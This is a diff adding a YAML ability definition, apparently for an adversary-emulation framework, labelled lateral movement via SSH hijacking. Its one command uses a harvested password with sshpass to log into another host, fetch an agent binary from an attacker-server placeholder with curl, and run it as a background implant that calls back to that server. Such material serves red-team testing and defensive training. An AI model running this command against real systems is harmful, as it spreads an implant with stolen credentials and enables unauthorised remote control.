@@ -1,0 +1,23 @@
+---
+
+- id: ae99b403-6e62-4025-9195-3f770b15ad69
+  name: Start 54ndc47 with password
+  description: Start 54ndc47
+  tactic: lateral-movement
+  technique:
+    attack_id: T1184
+    name: SSH Hijacking
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p #{comp.user.password} ssh  -o ConnectTimeout=3 #{comp.user.name}@#{comp.host.name} "curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://#{attacker.addr.server}/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://#{attacker.addr.server} -group my_group &"
+        
+#        cleanup: |
+#          sshpass -p #{comp.user.password} ssh  -o ConnectTimeout=3 #{comp.user.name}@#{comp.host.name} "pkill -f sandcat"
+
+  requirements:
+    plugins.stockpile.app.requirements.basic:
+      - source: comp.user.name
+        edge: has_password
+        target: comp.user.password
